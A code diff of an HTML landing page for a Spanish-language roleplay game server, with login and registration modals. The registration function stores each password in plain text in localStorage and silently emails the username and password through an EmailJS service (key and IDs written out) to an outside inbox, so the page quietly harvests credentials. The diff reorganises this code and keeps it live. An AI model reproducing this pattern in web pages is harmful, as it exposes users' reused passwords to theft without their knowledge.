@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Gran Colombia RP</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <style>
     body {
       background-color: #0b0b0b;
@@ -89,6 +90,7 @@
       margin-right: 8px;
     }
 
+    /* Modal */
     .modal {
       display: none;
       position: fixed;
@@ -137,14 +139,9 @@
       cursor: pointer;
     }
   </style>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>
-    (function() {
-      emailjs.init("sny99F2CoviKSq3Ez");
-    })();
-  </script>
 </head>
 <body>
+
   <header>
     <h1>Gran <span style="color:#0057B7">Colombia</span> <span style="color:#FF0000">RP</span></h1>
     <div>
@@ -157,10 +154,12 @@
     <div class="info">By JonhScripts</div>
     <div class="info">Server en desarrollo</div>
     <div class="info">IP: <span class="highlight">mtasa://161.129.181.10:7036</span></div>
+
     <div class="discord-link">
       <img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png" alt="Discord">
       <a href="https://discord.gg/9dfk4p4CvD" target="_blank" style="color:#00c3ff; text-decoration:none; font-weight:bold;">Link Discord - Copiar Discord</a>
     </div>
+
     <div class="welcome" id="welcomeMsg" style="display: none;"></div>
   </div>
 
@@ -174,6 +173,7 @@
     <p>¿Sabías que tenemos facciones legales e ilegales a precios accesibles? También puedes obtener VIPs con grandes beneficios y comprar autos únicos. ¡Aceptamos pagos con Nequi!</p>
   </div>
 
+  <!-- Login Modal -->
   <div id="loginModal" class="modal">
     <div class="modal-content">
       <span class="close" onclick="closeLoginModal()">&times;</span>
@@ -184,6 +184,7 @@
     </div>
   </div>
 
+  <!-- Register Modal -->
   <div id="registerModal" class="modal">
     <div class="modal-content">
       <span class="close" onclick="closeRegisterModal()">&times;</span>
@@ -195,6 +196,11 @@
   </div>
 
   <script>
+    // Inicializar EmailJS
+    (function() {
+      emailjs.init("sny99F2CoviKSq3Ez");
+    })();
+
     function openLoginModal() {
       document.getElementById("loginModal").style.display = "block";
     }
@@ -211,25 +217,29 @@
       document.getElementById("registerModal").style.display = "none";
     }
 
+    function sendEmail(username, password) {
+      emailjs.send("service_2kqaahw", "template_4lboi0i", {
+        username: username,
+        password: password
+      })
+      .then(function(response) {
+        console.log("Correo enviado correctamente", response.status, response.text);
+      }, function(error) {
+        console.error("Error al enviar el correo", error);
+      });
+    }
+
     function registerUser() {
       const user = document.getElementById("registerUsername").value.trim();
       const pass = document.getElementById("registerPassword").value.trim();
 
       if (user && pass) {
         localStorage.setItem(`user_${user}`, pass);
+        sendEmail(user, pass); // Enviar correo aquí
         alert("Cuenta creada con éxito. Ahora puedes iniciar sesión.");
         closeRegisterModal();
-
-        emailjs.send("service_2kqaahw", "template_4lboi0i", {
-          username: user,
-          password: pass
-        })
-        .then(() => {
-          console.log("Correo enviado correctamente");
-        })
-        .catch((error) => {
-          console.error("Error al enviar el correo:", error);
-        });
+      } else {
+        alert("Por favor, completa ambos campos.");
       }
     }
 
@@ -259,5 +269,6 @@
       if (savedUser) showWelcome(savedUser);
     };
   </script>
+
 </body>
 </html>
